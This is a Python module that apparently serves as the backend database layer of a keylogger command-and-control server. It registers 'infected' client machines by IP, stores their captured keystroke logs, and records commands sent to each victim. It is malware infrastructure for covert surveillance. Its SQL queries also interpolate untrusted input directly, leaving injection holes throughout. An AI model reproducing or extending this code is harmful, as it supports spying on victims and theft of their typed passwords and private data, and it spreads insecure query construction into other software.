import pyodbc  # Needs to be installed.

class Database:  # Object to work with database.

    client_info = "client_info"  # Table with client info.
    log_info = "log_data"  # Table with logged data.
    client_connections = "client_connections"
    client_commands = "client_commands"

    def __init__(self):
        self.database_info ="""
            Driver={ODBC Driver 17 for SQL Server};
            Server=DESKTOP-UCFQ6S6\SQLEXPRESS;
            Database=key_logger;
            Trusted_Connection=yes;
            """  # Contains multiline string with database info.
        self.connection = pyodbc.connect(self.database_info)
        self.cursor = self.connection.cursor()

    def add_client(self, client_address):  # Adds new client or existing client.
        client = self.cursor.execute(f"""
                            SELECT *
                            FROM {self.client_info}
                            WHERE client_ip = '{client_address[0]}'""").fetchone()  # Querys DB to find User
        if client:  # If row for existing client was found.
            print(f'[{client.infected_date}] RECEIVED CONNECTION FROM CLIENT#: {client.client_id}')
        else:  # No client exists.
            self.cursor.execute(f"""
                                INSERT INTO {self.client_info}(client_ip, client_port, infected_date)
                                VALUES('{client_address[0]}', '{client_address[1]}', GETDATE())""").commit()  # Inserts new client
            client = self.cursor.execute(f"""
                                 SELECT *
                                 FROM {self.client_info}
                                 WHERE client_ip = '{client_address[0]}' AND client_port = {client_address[1]}""").fetchone()  # Reads client.
            print(f'[{client.infected_date}] RECEIVED A NEW CONNECTION FROM CLIENT#: {client.client_id}')
        return client.client_id

    def log_connection(self, client_id, connection_type):  # Logs a user connection/disconnection.
        self.cursor.execute(f"""
                            INSERT INTO {self.client_connections} (client_id, connection_type, date_info)
                            VALUES({client_id}, {connection_type}, GETDATE())""").commit()

    def write_log(self, client_id, data):  # Writes log to storage.
        self.cursor.execute(f"""
                            INSERT INTO {self.log_info}(client_id, log_data, date_info)
                            VALUES({client_id}, '{data}', GETDATE())""").commit()  # Inserts log info.

    def log_command(self, client_id, command): # Logs the commands that are sent to each client.
        self.cursor.execute(f"""
                            INSERT INTO {self.client_commands}(client_id, command, command_date)
                            VALUES({client_id}, '{command}', GETDATE())""").commit()  # Inserts log info.

    def get_id_from_ip(self, client_ip):
        results = self.cursor.execute(f"""SELECT client_id 
                                          FROM {self.client_info} 
                                          WHERE client_ip = '{client_ip}'""").fetchone()
        return results.client_id

    def read(self):
        print("Read")
        cursor = self.connection.cursor()
        cursor.execute("SELECT * FROM client_info")
        for row in cursor:
            print(f"Row = {row}")
